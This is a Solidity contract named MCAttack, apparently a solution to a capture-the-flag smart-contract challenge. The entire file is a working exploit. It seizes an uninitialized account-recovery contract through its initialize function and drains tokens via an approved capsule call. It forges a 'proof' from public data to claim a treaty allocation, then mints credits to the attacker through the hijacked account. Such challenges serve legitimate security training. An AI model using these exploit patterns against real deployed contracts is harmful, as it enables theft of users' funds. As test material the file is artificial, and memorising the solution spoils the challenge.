// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;


import {IAccountRecoveryV2, ISafeSmartWallet, ISovereignAI, IMeridianCredits} from "./IMeridianConcordat.sol";

contract MCAttack {
    IAccountRecoveryV2 public v2;
    ISafeSmartWallet public safeSmartWallet;
    IMeridianCredits public Mc;
    address public BOREAS;
    address public HELIX;
    address public AXIOM;
    address public capsule;
    address public player;


    constructor (address _boreas, address _helix, address _axiom, IMeridianCredits _mc, address _capsule, address _player) {
        BOREAS = _boreas;
        HELIX = _helix;
        AXIOM = _axiom;        
        Mc = _mc;
        capsule = _capsule;
        player = _player;
    }

    function attack () public {
        // attack 1
        address[] memory gardian = new address[](1);
        gardian[0] = player;
        IAccountRecoveryV2(BOREAS).initialize(address(this), gardian);
        

        // atack 2
        bytes memory data2 = abi.encode(player, 500_000*10**18);
        ISafeSmartWallet(HELIX).executeApprovedCapsule(capsule, data2);

        string memory manifesto = ISovereignAI(AXIOM).manifesto();
        bytes32 seed = keccak256(abi.encodePacked(manifesto));
        ISovereignAI(AXIOM).initiateCooperation();
        bytes32 proof = keccak256(abi.encodePacked(address(this), seed));
        ISovereignAI(AXIOM).proveUnderstanding(proof);
        uint256 amount = ISovereignAI(AXIOM).treatyAllocation();
        ISovereignAI(AXIOM).claimTreatyAllocation(BOREAS, amount);

        bytes memory data1 = abi.encodeWithSelector(Mc.mint.selector, player, 500_000*10**18 + amount);
        IAccountRecoveryV2(BOREAS).execute(address(Mc), data1);

    } 
}